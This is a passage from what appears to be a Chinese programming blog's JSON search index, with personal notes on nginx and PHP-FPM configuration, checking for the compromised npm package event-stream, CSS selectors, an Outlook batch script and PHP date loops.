檢查是否有這個檔案或資料夾存在，不存在則使用index.php內容</span><br><span class=\"line\">        try_files $uri $uri/ /index.php;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>rewrite ^/(.*)$ /index.php?/$1 last;</code>這段寫法是在網址前面加上 index.php<br>只要有關 index.php 都會導入到 phpfpm 裡面去</p>\n<p><a href=\"https://blog.51cto.com/10546390/1754757\" target=\"_blank\" rel=\"noopener\">Nginx 的 try_files 参数保证能懂的讲解-10536390-51CTO 博客</a> <a href=\"/blog/2019/04/07/nginx設定小記/2.png\" title=\"備份圖\">備份圖</a><br><a href=\"https://www.hi-linux.com/posts/53878.html\" target=\"_blank\" rel=\"noopener\">Nginx 的 try_files 指令使用实例 - 运维之美</a><br><a href=\"https://yii.im/posts/the-right-way-to-set-nginx-for-laravel/\" target=\"_blank\" rel=\"noopener\">请给你的 Laravel 一份更好的 Nginx 配置 · yii.im</a> <a href=\"/blog/2019/04/07/nginx設定小記/1.png\" title=\"備份圖\">備份圖</a></p>\n<h2 id=\"nginx-if\"><a href=\"#nginx-if\" class=\"headerlink\" title=\"nginx if\"></a>nginx if</h2><blockquote>\n<p>計算指定的 condition 的值。如果為真，執行定義在大括號中的 rewrite 模塊指令，並將 if 指令中的配置指定給請求。if 指令會從上一層配置中繼承配置。<br>條件可以是下列任意一種：<br>變量名；如果變量值為空或者是以「0」開始的字符串，則條件為假；<br>使用「=」和「!=」運算符比較變量和字符串；<br>使用「~」（大小寫敏感）和「~*」（大小寫不敏感）運算符匹配變量和正則表達式。正則表達式可以包含匹配組，匹配結果後續可以使用變量$1..$9 引用。如果正則表達式中包含字符「}」或者「;」，整個表達式應該被包含在單引號或雙引號的引用中。<br>使用「-f」和「!-f」運算符檢查文件是否存在；<br>使用「-d」和「!-d」運算符檢查目錄是否存在；<br>使用「-e」和「!-e」運算符檢查文件、目錄或符號鏈接是否存在；<br>使用「-x」和「!-x」運算符檢查可執行文件；</p>\n</blockquote>\n<p><a href=\"https://blog.51cto.com/cuidehua/1874770\" target=\"_blank\" rel=\"noopener\">nginx location if 的匹配規則-殘劍-51CTO 博客</a><br><a href=\"https://xwsoul.com/posts/761\" target=\"_blank\" rel=\"noopener\">Nginx 配置陷阱之万恶的 if 指令 – 虚伪的灵魂</a><br><a href=\"https://xyz.cinc.biz/2016/06/nginx-if-and-host-get-variable.html\" target=\"_blank\" rel=\"noopener\">XYZ 的筆記本: Nginx if、and、網域名稱、GET 變數判斷</a></p>\n<h2 id=\"rewrite\"><a href=\"#rewrite\" class=\"headerlink\" title=\"rewrite\"></a>rewrite</h2><blockquote>\n<p>Context: server, location, if<br>rewrite regex replacement [flag];</p>\n</blockquote>\n<p><a href=\"https://segmentfault.com/a/1190000008102599\" target=\"_blank\" rel=\"noopener\">搞懂 nginx 的 rewrite 模块 - youyu 岁月 - SegmentFault 思否</a><br><a href=\"https://www.jianshu.com/p/3b2345f7347d\" target=\"_blank\" rel=\"noopener\">第七章：nginx 的 rewrite 规则详解 - 简书</a><br><a href=\"https://yungke.me/nginx-location-rewrite/\" target=\"_blank\" rel=\"noopener\">Nginx Rewrite 規則寫法 | Helloyungke</a></p>\n<p>因為我的專案程式有掛 nginx docker 裡面目錄<br>所以我猜測下面應該也能執行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">   location ~* \\.(js|jpg|png|css)$ &#123;</span><br><span class=\"line\">        expires 30d;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">[Laravel nginx conf file](https://gist.github.com/ashleydw/afd389b1e763d3c1cf1f)</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://stackoverflow.com/questions/41330739/serving-html-css-js-files-with-nginx\" target=\"_blank\" rel=\"noopener\">vhosts - Serving html / css / js files with nginx - Stack Overflow</a><br><a href=\"https://blog.51cto.com/tenderrain/1949254\" target=\"_blank\" rel=\"noopener\">nginx rewrite 指令 last break 区别-Tenderrain-51CTO 博客</a></p>\n<h2 id=\"fastcgi\"><a href=\"#fastcgi\" class=\"headerlink\" title=\"fastcgi\"></a>fastcgi</h2><p>fastcgi_index 相對就是 nginx index 差不多東西</p>\n<p><a href=\"https://www.oschina.net/question/92960_38798\" target=\"_blank\" rel=\"noopener\">nginx 配置里的 fastcgi_index 是用来干嘛？和 index 的区别是？ - 开源中国</a></p>\n<blockquote>\n<p>因此不再建议大家使用以下方式（搜了一下，网上大量的文章，并且 nginx.conf 的默认配置也是使用这种方式）：<br><del>fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; ~~<br>~~include fastcgi_params;</del><br>而推荐使用最新的方式：<br>include fastcgi.conf;</p>\n</blockquote>\n<p>fastcgi_split_path_info</p>\n<blockquote>\n<p>舊版本的 nginx 使用如下方式配置</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; location ~ .php($|/) &#123;</span><br><span class=\"line\">&gt;    set $script $uri;</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt;    set $path_info &quot;&quot;;</span><br><span class=\"line\">&gt;    if ($uri ~ &quot;^(.+.php)(/.+)&quot;) &#123;</span><br><span class=\"line\">&gt;    &gt;    set $script $1;</span><br><span class=\"line\">&gt;    &gt;    set $path_info $2;</span><br><span class=\"line\">&gt;    &#125;</span><br><span class=\"line\">&gt;    fastcgi_pass 127.0.0.1:9000;</span><br><span class=\"line\">&gt;    fastcgi_index index.php;</span><br><span class=\"line\">&gt;    fastcgi_param SCRIPT_FILENAME $document_root$script;</span><br><span class=\"line\">&gt;    fastcgi_param SCRIPT_NAME $script;</span><br><span class=\"line\">&gt;    fastcgi_param PATH_INFO $path_info;</span><br><span class=\"line\">&gt; &#125;</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<p>新版本的 nginx 也可以使用 fastcgi_split_path_info 指令來設置 PATH_INFO，舊的方式不再推薦使用，在 location 段添加如下配置。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; location ~ ^.+.php &#123;</span><br><span class=\"line\">&gt; (...)</span><br><span class=\"line\">&gt; fastcgi_split_path_info ^((?U).+.php)(/?.+)$;</span><br><span class=\"line\">&gt;   fastcgi_param SCRIPT_FILENAME /path/to/php$fastcgi_script_name;</span><br><span class=\"line\">&gt; fastcgi_param PATH_INFO $fastcgi_path_info;</span><br><span class=\"line\">&gt;   fastcgi_param PATH_TRANSLATED $document_root\\$fastcgi_path_info;</span><br><span class=\"line\">&gt; (...)</span><br><span class=\"line\">&gt; &#125;</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p>fastcgi_param 可設定環境參數<br>其他可參考<a href=\"https://segmentfault.com/a/1190000002667095\" target=\"_blank\" rel=\"noopener\">ngx_http_fastcgi_module 的那些事 - Web 开发手扎 - SegmentFault 思否</a> <a href=\"/blog/2019/04/07/nginx設定小記/phpfpm_1.png\" title=\"備份圖\">備份圖</a></p>\n<p>這邊我還是搞不懂 phpfpm 跟 mod_php 到底有什麼差別<br>有 google 爬到一篇，秒懂</p>\n<blockquote>\n<p>FastCGI 是什麼?<br>接下來又提到那 FastCGI 是什麼呢? FastCGI 是用來提高 CGI 處理 process 性能用的<br>那 FastCGI 會怎麼實作呢?<br>當 php 啟動時、會去尋找 php.ini、進行環境的初始化，如果不使用 FastCGI 的情況下，每一個請求都會做這個動作，很明顯浪費系統資源，所以 FastCGI 會先啟動一個 master，解析配置文件用，接下來再啟動 worker，當請求過來時、master 會遞資訊給 worker，然後接下來等下一個請求，有這個機制就不用每一次重新跑一次初始化的動作了</p>\n</blockquote>\n<p><a href=\"https://www.astralweb.com.tw/what-is-differences-between-fastcgi-php-fpm/\" target=\"_blank\" rel=\"noopener\">秒懂 PHP 的 FastCGI 跟 PHP-FPM 有什麼關係 - Astral web 歐斯瑞公司</a></p>\n<p><a href=\"https://gxl-ct001.iteye.com/blog/2270522\" target=\"_blank\" rel=\"noopener\">[转] fastcgi.conf 与 fastcgi_params - - ITeye 博客</a></p>\n<p><a href=\"https://www.cnblogs.com/clphp/p/5106284.html\" target=\"_blank\" rel=\"noopener\">\\$_SERVER[‘SCRIPT_FILENAME’] 与 <strong>FILE</strong> 区别 - 常斯特啰嗦司机 - 博客园</a><br><a href=\"http://wangying.sinaapp.com/archives/796\" target=\"_blank\" rel=\"noopener\">Nginx(PHP/fastcgi)的 PATH_INFO 配置 | 尘埃</a><br><a href=\"https://my.oschina.net/zhichi2011/blog/118409\" target=\"_blank\" rel=\"noopener\">nginx 新手配置\\$document_root - 海盗船的个人空间 - 开源中国</a><br><a href=\"https://blog.51cto.com/leeyan/1865448\" target=\"_blank\" rel=\"noopener\">nginx 使用 arg_重写带参数 url 案例-明天过后-51CTO 博客</a></p>\n"},{"title":"nodejs event stream被植入比特幣小記","url":"/blog/2018/11/29/nodejs-event-stream%E8%A2%AB%E6%A4%8D%E5%85%A5%E6%AF%94%E7%89%B9%E5%B9%A3%E5%B0%8F%E8%A8%98/","content":"<p>最近npm的<code>event stream</code>吵得沸沸揚揚的<br>竟然有人偷偷植入挖幣程式在裡面<br>只要有import都會中標<br>這篇指記錄有沒有中標</p>\n<a id=\"more\"></a>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm ls event-stream flatmap-stream</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm ls -g event-stream flatmap-stream</span><br></pre></td></tr></table></figure>\n<img src=\"/blog/2018/11/29/nodejs-event-stream被植入比特幣小記/1.png\" title=\"指令\">\n<p>參考來源:<a href=\"http://caibaojian.com/event-stream.html\" target=\"_blank\" rel=\"noopener\">吃瓜群众带你了解 NMP 包 event-stream 被植入比特币后门的来龙去脉-前端开发博客</a></p>\n<p>更多八卦….<br><a href=\"https://zhuanlan.zhihu.com/p/50938220?fbclid=IwAR01keb43yqDo_1AqH9WMGpGiDzmSx47TfDuoneElZmKDKsPmi-TrFuFqf0\" target=\"_blank\" rel=\"noopener\">月下载量千万的 npm 包被黑客篡改，Vue 开发者可能正在遭受攻击 - 知乎</a></p>\n","categories":["JavaScript"]},{"title":"nth-of-type不能用在class selector","url":"/blog/2018/07/02/nth-of-type%E4%B8%8D%E8%83%BD%E7%94%A8%E5%9C%A8class-selector/","content":"<p>今天踩雷，想用CSS控制class第以個做操控<br>nth-of-type 跟nth-child<br>nth-of-type是找 第幾個子元素<br>nth-child是找位置(位置是指所有元素)</p>\n<p>不能抓<code>.aaa:first-of-type</code>不能正常跑<br><strong>只能對html元素</strong><br>不能對class</p>\n<p>這個雷不要再踩到!!!</p>\n","categories":["CSS"],"tags":["css","nth-of-type","nth-child"]},{"title":"outlook自動開啟新信件","url":"/blog/2018/06/24/outlook%E8%87%AA%E5%8B%95%E9%96%8B%E5%95%9F%E6%96%B0%E4%BF%A1%E4%BB%B6/","content":"<p>現在工作每天都要寫工作進度<br>有時候小小一個動作<br>可以省很多時間做調整</p>\n<p>這個bat是網路找的…</p>\n<a id=\"more\"></a>\n<figure class=\"highlight bat\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">REM 取得今天的年、月、日 (自動補零)</span></span><br><span class=\"line\"><span class=\"built_in\">SET</span> TodayYear=<span class=\"variable\">%date:~2,2%</span></span><br><span class=\"line\"><span class=\"built_in\">SET</span> TodayMonthP0=<span class=\"variable\">%date:~5,2%</span></span><br><span class=\"line\"><span class=\"built_in\">SET</span> TodayDayP0=<span class=\"variable\">%date:~8,2%</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">REM 取得今天的年、月、日 (純數字)</span></span><br><span class=\"line\"><span class=\"comment\">REM 2010/08/03 更新：以下是為了修正 Batch 遇到 08, 09 會視為八進位的問題</span></span><br><span class=\"line\"><span class=\"keyword\">IF</span> <span class=\"variable\">%TodayMonthP0:~0,1%</span> == <span class=\"number\">0</span> (</span><br><span class=\"line\">\t<span class=\"built_in\">SET</span> /A TodayMonth=<span class=\"variable\">%TodayMonthP0:~1,1%</span>+<span class=\"number\">0</span></span><br><span class=\"line\">) <span class=\"keyword\">ELSE</span> (</span><br><span class=\"line\">\t<span class=\"built_in\">SET</span> /A TodayMonth=TodayMonthP0+<span class=\"number\">0</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">IF</span> <span class=\"variable\">%TodayMonthP0:~0,1%</span> == <span class=\"number\">0</span> (</span><br><span class=\"line\">\t<span class=\"built_in\">SET</span> /A TodayDay=<span class=\"variable\">%TodayDayP0:~1,1%</span>+<span class=\"number\">0</span></span><br><span class=\"line\">) <span class=\"keyword\">ELSE</span> (</span><br><span class=\"line\">\t<span class=\"built_in\">SET</span> /A TodayDay=TodayDayP0+<span class=\"number\">0</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 日期 <span class=\"variable\">%TodayYear%</span>/<span class=\"variable\">%TodayMonthP0%</span>/<span class=\"variable\">%TodayDayP0%</span></span><br><span class=\"line\"><span class=\"built_in\">pause</span></span><br><span class=\"line\">\"C:\\Program Files (x86)\\Microsoft Office\\Office12\\outlook.exe\" /c ipm.note /m \"mailto:'xxxxx'&lt;ooooooo&gt;;'xxxxx' &lt;oooooo&gt;;&amp;subject=ZeYi-<span class=\"variable\">%TodayYear%</span><span class=\"variable\">%TodayMonthP0%</span><span class=\"variable\">%TodayDayP0%</span> 工作回報&amp;body=Dear all:\"</span><br></pre></td></tr></table></figure>\n<p>參考來源：</p>\n<p><a href=\"https://blog.miniasp.com/post/2009/11/03/How-to-get-system-date-time-in-batch-file-part-III.aspx\" target=\"_blank\" rel=\"noopener\">The Will Will Web | 如何在 Batch 檔取得系統的日期、時間欄位 (第三版)</a></p>\n<p><a href=\"https://www.extendoffice.com/documents/outlook/5277-outlook-new-email-command-line.html\" target=\"_blank\" rel=\"noopener\">How to create an Outlook new email with specified command line?</a></p>\n","categories":["寫程式一些事"],"tags":["outlook","自動化"]},{"title":"php switch, if, 陣列套用方法比較","url":"/blog/2019/07/04/php-Switch-if-%E9%99%A3%E5%88%97%E5%A5%97%E7%94%A8%E6%96%B9%E6%B3%95%E6%AF%94%E8%BC%83/","content":"<p>最近聽到 PHP 盡量不要用 switch 做條件<br>用 array 方式比較快!!<br>網路上很多都是比較 switch, if<br>當下就好奇了一下，修改遺下看秒數</p>\n<a id=\"more\"></a>\n<h2 id=\"if-switch-比較\"><a href=\"#if-switch-比較\" class=\"headerlink\" title=\"if,switch 比較\"></a>if,switch 比較</h2><p><a href=\"http://joujiahe.blogspot.com/2011/09/php-if-vs-switch.html\" target=\"_blank\" rel=\"noopener\">Jiahe Jou: [轉錄] PHP - if v.s. switch 誰快?</a></p>\n<p>當下修正<br><a href=\"https://3v4l.org/t8CM0\" target=\"_blank\" rel=\"noopener\">Online PHP editor | output for t8CM0</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Output for 7.3.5</span><br><span class=\"line\">    Performance Testing PHP if / else VS switch with 100,000 iterations</span><br><span class=\"line\"></span><br><span class=\"line\">    total if / else time: 0.007087230682373</span><br><span class=\"line\">    total case time: 0.0072040557861328</span><br><span class=\"line\">    total array time: 0.006603479385376</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Output for 5.6.0</span><br><span class=\"line\">    Performance Testing PHP if / else VS switch with 100,000 iterations</span><br><span class=\"line\"></span><br><span class=\"line\">    total if / else time: 0.035436391830444</span><br><span class=\"line\">    total case time: 0.026345729827881</span><br><span class=\"line\">    total array time: 0.046525478363037</span><br></pre></td></tr></table></figure>\n<p>可以看出 PHP 7 陣列效能真的快很多了</p>\n<p>不過，我覺得還是要看情況用<br>不然失去程式可讀性也不是很好</p>\n","categories":["PHP"],"tags":["switch","if"]},{"title":"php-excel-templator 用範本(template)快速產生Excel方法","url":"/blog/2019/09/03/php-excel-templator-%E7%94%A8%E7%AF%84%E6%9C%AC-template-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9FExcel%E6%96%B9%E6%B3%95/","content":"<p>最近在工作上常常做報表(Excel)<br>常常用程式控制 Excel 格式<br>非常不方便<br>最近在找找有沒有用 template 好用工具</p>\n<a id=\"more\"></a>\n<p>之前有找這些東西，但沒有比較好用。最近看到<code>php-excel-templator</code>這個，完整性感覺還滿高的。</p>\n<h2 id=\"php-excel-templator\"><a href=\"#php-excel-templator\" class=\"headerlink\" title=\"php-excel-templator\"></a>php-excel-templator</h2><p><a href=\"https://github.com/alhimik1986/php-excel-templator\" target=\"_blank\" rel=\"noopener\">alhimik1986/php-excel-templator: PHP Spreadsheet extension to the export excel file from excel template</a></p>\n<p>可以從 array 去塞一維、二維陣列</p>\n<blockquote>\n<pre><code>{var_name} - for string values\n</code></pre><p>   [var_name] - for one-dimensional arrays<br>   [[var_name]] - for two-dimensional arrays</p>\n</blockquote>\n<p>雖然這個沒有從 Excel 塞<code>key</code>進去，需要照 array 每個值的位子去塞<br>但還有對相關欄位做背景顏色設定<br>這部份可相對完整!!<br>裡面還有範例，可以算是非常好上手</p>\n<h2 id=\"其他程式\"><a href=\"#其他程式\" class=\"headerlink\" title=\"其他程式\"></a>其他程式</h2><p><a href=\"https://github.com/optilude/xlsx-template\" target=\"_blank\" rel=\"noopener\">optilude/xlsx-template: A NodeJS module to generate Excel files in .xlsx format from a template created with Excel itself</a><br>這個星星數也滿高的，有針對 key 去塞<br>裡面也有範例檔案，但<code>key</code>沒對到程式就會出現錯誤</p>\n<p><a href=\"https://github.com/ivahaev/go-xlsx-templater\" target=\"_blank\" rel=\"noopener\">ivahaev/go-xlsx-templater: Simple xlsx template based document generator</a><br><a href=\"https://dustinhsiao21.com/2018/08/15/maatwebsite-laravel-excel-export/\" target=\"_blank\" rel=\"noopener\">透過MAATWEBSITE/LARAVEL-EXCEL匯出資料-EXPORT - Dustin’s murmur</a></p>\n<h2 id=\"小記\"><a href=\"#小記\" class=\"headerlink\" title=\"小記\"></a>小記</h2><p>有網路上爬到 <code>docx</code> 其實是一個壓縮檔，可以直接用 zip 打開，看裡面的檔案<br>難怪之前有一篇有用<a href=\"https://malagege.github.io/blog/2018/09/18/Java%E6%93%8D%E4%BD%9CPOI%E4%BF%AE%E6%94%B9%E5%A0%B1%E8%A1%A8sample%E6%AA%94%E7%99%BC%E7%94%9F%E4%BF%A1%E4%BB%BB%E6%B4%BB%E9%A0%81%E7%B0%BF%E5%95%8F%E9%A1%8C/\">Java操作POI修改報表sample檔發生信任活頁簿問題 | 程式狂想筆記</a>去看問題</p>\n<p>這當中有<br><a href=\"https://forums.asp.net/t/2119763.aspx?Open+XML+SDK+and+Excel+generation+from+template\" target=\"_blank\" rel=\"noopener\">Open XML SDK and Excel generation from template | The ASP.NET Forums</a></p>\n<p>之前有寫過類似文章<br><a href=\"https://malagege.github.io/blog/2019/05/05/Word-Excel%E7%9A%84%E7%9B%B8%E9%97%9Ctemplate%E5%A5%97%E4%BB%B6%E5%B0%8F%E8%A8%98/\">Word,Excel的相關template套件小記 | 程式狂想筆記</a></p>\n<p><a href=\"http://lhzyaminabe.blogspot.com/2016/01/openxmldocx.html\" target=\"_blank\" rel=\"noopener\">語言的大雜燴: [NuGet]用OpenXml在docx中套版列印 - 基本型</a><br><a href=\"https://blog.darkthread.net/blog/docx-templating/\" target=\"_blank\" rel=\"noopener\">【雛型】Docx套版列印功能試作-黑暗執行緒</a></p>\n<p><strong>2019-09-08</strong><br>發現<a href=\"https://github.com/shadz3rg/PHPStamp\" target=\"_blank\" rel=\"noopener\">shadz3rg/PHPStamp: The XSL-way templating library for MS Office Word DOCX documents.</a>這個感覺不錯用套件<br>之前有寫過這篇<a href=\"https://malagege.github.io/blog/2019/05/05/Word-Excel%E7%9A%84%E7%9B%B8%E9%97%9Ctemplate%E5%A5%97%E4%BB%B6%E5%B0%8F%E8%A8%98/\">Word,Excel的相關template套件小記 | 程式狂想筆記</a></p>\n","categories":["PHP"],"tags":["php","template"]},{"title":"php for迴圈跑date+1天運算記錄","url":"/blog/2018/08/05/php-for%E8%BF%B4%E5%9C%88%E8%B7%91date-1%E9%81%8B%E7%AE%97%E8%A8%98%E9%8C%84/","content":"<p>最近剛好做要依日期做for迴圈<br>就試著寫寫看<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> ($now_date = $first_day; $now_date &lt;= $last_day; $now_date = date(<span class=\"string\">'Y-m-d'</span>, strtotime(<span class=\"string\">\"$now_date +1 DAY\"</span>)))&#123;</span><br><span class=\"line\">    ...    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>寫完覺得寫出還滿實用的東西<br>Google爬一下有什麼解法<br>瞬間覺得我的code是垃圾orz</p>\n<a id=\"more\"></a>\n<h2 id=\"Stack-Overflow寫法\"><a href=\"#Stack-Overflow寫法\" class=\"headerlink\" title=\"Stack Overflow寫法\"></a>Stack Overflow寫法</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$begin = <span class=\"keyword\">new</span> DateTime(<span class=\"string\">'2010-05-01'</span>);</span><br><span class=\"line\">$end = <span class=\"keyword\">new</span> DateTime(<span class=\"string\">'2010-05-10'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">$interval = DateInterval::createFromDateString(<span class=\"string\">'1 day'</span>);</span><br><span class=\"line\">$period = <span class=\"keyword\">new</span> DatePeriod($begin, $interval, $end);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span> ($period <span class=\"keyword\">as</span> $dt) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $dt-&gt;format(<span class=\"string\">\"l Y-m-d H:i:s\\n\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://stackoverflow.com/questions/3207749/i-have-2-dates-in-php-how-can-i-run-a-foreach-loop-to-go-through-all-of-those-d\" target=\"_blank\" rel=\"noopener\">I have 2 dates in PHP, how can I run a foreach loop to go through all of those days? - Stack Overflow</a></p>\n<h2 id=\"官網範例\"><a href=\"#官網範例\" class=\"headerlink\" title=\"官網範例\"></a>官網範例</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$begin = <span class=\"keyword\">new</span> DateTime( <span class=\"string\">'2012-08-01'</span> );</span><br><span class=\"line\">$end = <span class=\"keyword\">new</span> DateTime( <span class=\"string\">'2012-08-31'</span> );</span><br><span class=\"line\">$end = $end-&gt;modify( <span class=\"string\">'+1 day'</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">$interval = <span class=\"keyword\">new</span> DateInterval(<span class=\"string\">'P1D'</span>);</span><br><span class=\"line\">$daterange = <span class=\"keyword\">new</span> DatePeriod($begin, $interval ,$end);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span>($daterange <span class=\"keyword\">as</span> $date)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $date-&gt;format(<span class=\"string\">\"Ymd\"</span>) . <span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>感覺實務上還是竟量用DateTime()物件<br>modify竟然也有做時間加總運算<br>DatePeriod可以做到日期跑一遍<br>真的很方便</p>\n<h2 id=\"DateInterval\"><a href=\"#DateInterval\" class=\"headerlink\" title=\"DateInterval\"></a>DateInterval</h2><p><a href=\"http://php.net/manual/zh/class.dateinterval.php\" target=\"_blank\" rel=\"noopener\">PHP: DateInterval - Manual</a><br>DateInterval可以做時間之間運算<br>使用DateTime裡面的add/sub<br>最神的還能用在diff<br>算兩個之間差<br>詳細可以再看看<a href=\"http://php.net/manual/zh/class.datetime.php\" target=\"_blank\" rel=\"noopener\">PHP: DateTime - Manual</a>裡面</p>\n<p>裡面爬到DateInterval沒有負的時間<br>裡面神人有寫<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DateRange</span> <span class=\"keyword\">extends</span> <span class=\"title\">ArrayIterator</span></span></span><br><span class=\"line\"><span class=\"class\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">protected</span> $oDate = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> $oStartDate = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> $oEndDate = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> $oInterval = <span class=\"keyword\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">( DateTime $oStartDate, DateTime $oEndDate, DateInterval $oInterval = null )</span></span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;oStartDate = $oStartDate;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;oDate = <span class=\"keyword\">clone</span> $oStartDate;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;oEndDate = $oEndDate;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;oInterval = $oInterval;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">next</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;oDate-&gt;add(<span class=\"keyword\">$this</span>-&gt;oInterval);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;oDate;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">current</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;oDate;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">valid</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;oStartDate &gt; <span class=\"keyword\">$this</span>-&gt;oEndDate)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;oDate &gt;= <span class=\"keyword\">$this</span>-&gt;oEndDate;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;oDate &lt;= <span class=\"keyword\">$this</span>-&gt;oEndDate;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$oRange = <span class=\"keyword\">new</span> DateRange(<span class=\"keyword\">new</span> DateTime(<span class=\"string\">\"2013-10-01\"</span>), <span class=\"keyword\">new</span> DateTime(<span class=\"string\">\"2013-01-01\"</span>), DateInterval::createFromDateString(<span class=\"string\">\"-1 month\"</span>) );</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> ($oRange <span class=\"keyword\">as</span> $oDate)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $oDate-&gt;format(<span class=\"string\">\"Y-m-d\"</span>) . <span class=\"string\">\"&lt;br /&gt;\"</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"DatePeriod\"><a href=\"#DatePeriod\" class=\"headerlink\" title=\"DatePeriod\"></a>DatePeriod</h2><p><a href=\"http://php.net/DatePeriod\" target=\"_blank\" rel=\"noopener\">PHP: DatePeriod - Manual</a>裡面的Traversable<br>可以用foreach，不過php裡面沒寫interface function讓我有點疑惑???</p>\n<p>感覺有很多東西可以寫，先筆記紀錄</p>\n<p>參考來源:</p>\n<ul>\n<li><a href=\"https://tecadmin.net/php-loop-between-two-dates/\" target=\"_blank\" rel=\"noopener\">PHP - Loop Between Two Dates - TecAdmin.net</a></li>\n<li><a href=\"http://php.net/DatePeriod\" target=\"_blank\" rel=\"noopener\">PHP: DatePeriod - Manual</a></li>\n<li><a href=\"https://stackoverflow.com/questions/3207749/i-have-2-dates-in-php-how-can-i-run-a-foreach-loop-to-go-through-all-of-those-d\" target=\"_blank\" rel=\"noopener\">I have 2 dates in PHP, how can I run a foreach loop to go through all of those days? - Stack Overflow</a></li>\n</ul>\n","categories":["PHP"],"tags":["php","date"]},{"title":"php pcntl_fork 